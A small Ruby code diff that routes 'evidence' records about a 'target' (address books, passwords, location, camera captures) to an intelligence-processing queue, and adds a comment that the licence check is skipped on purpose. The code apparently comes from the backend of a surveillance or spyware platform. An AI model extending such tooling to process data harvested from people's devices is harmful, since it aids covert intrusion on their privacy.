@@ -247,8 +247,11 @@ class InstanceWorker
       AggregatorQueue.add(@target._id, evidence._id, evidence.type)
     end
 
-    # pass the info to the intelligence module to extract handles
-    IntelligenceQueue.add(@target._id, evidence._id, :evidence) if ['addressbook', 'password', 'position', 'camera'].include? evidence.type
+    # Do not check the intelligence license is enabled here. Some of the intelligence
+    # features are provided WITHOUT the intelligence license.
+    if ['addressbook', 'password', 'position', 'camera'].include?(evidence.type)
+      IntelligenceQueue.add(@target._id, evidence._id, :evidence)
+    end
   end
 
   def resume
